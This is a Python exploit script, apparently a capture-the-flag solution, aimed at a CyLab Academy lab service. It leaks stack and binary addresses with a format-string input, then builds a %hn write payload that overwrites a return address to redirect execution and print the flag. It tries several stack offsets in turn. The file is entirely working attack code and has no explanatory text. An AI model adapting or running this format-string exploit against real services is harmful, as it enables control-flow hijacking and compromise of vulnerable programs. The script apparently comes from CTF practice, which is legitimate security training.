import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 28899
PF_OFF = 0x1269

for delta in (8, 0, 0x10, 0x78, 0x70):
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.settimeout(6)
        time.sleep(0.6)
        try:
            s.recv(4096)
        except Exception:
            pass
        s.sendall(b"%9$p.%27$p\n")
        time.sleep(0.6)
        data = s.recv(8192).decode("utf-8", "replace")
        vals = re.findall(r"0x[0-9a-f]+", data)
        if len(vals) < 2:
            print("delta", delta, "leaks insuffisants")
            s.close()
            continue
        p9 = int(vals[0], 16)
        base = int(vals[1], 16) - 0x1401
        pf = base + PF_OFF
        ret_addr = p9 + delta
        print(f"delta={delta} p9={hex(p9)} ret={hex(ret_addr)} pf={hex(pf)}")
        targets = [(ret_addr, pf & 0xFFFF), (ret_addr + 4, (pf >> 32) & 0xFFFF), (ret_addr + 2, (pf >> 16) & 0xFFFF)]
        targets.sort(key=lambda t: t[1])
        spec = ""
        prev = 0
        for i, (addr, val) in enumerate(targets):
            d = (val - prev) & 0xFFFF
            if d:
                spec += f"%{d}c"
            spec += f"%{11 + i}$hn"
            prev = val
        pad = (-len(spec)) % 8
        payload = spec.encode() + b"P" * pad
        for addr, val in targets:
            payload += struct.pack("<Q", addr)
        if len(payload) > 99:
            print("  trop long")
            s.close()
            continue
        s.sendall(payload + b"\n")
        time.sleep(1.0)
        out = ""
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                out += chunk.decode("utf-8", "replace")
        except Exception:
            pass
        s.close()
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", out)
        print("  tail:", out[-150:].replace("\n", " ") if not m else m.group(0))
        if m:
            print("  FLAG:", m.group(0))
            break
    except Exception as e:
        print("delta", delta, "err", type(e).__name__, e)
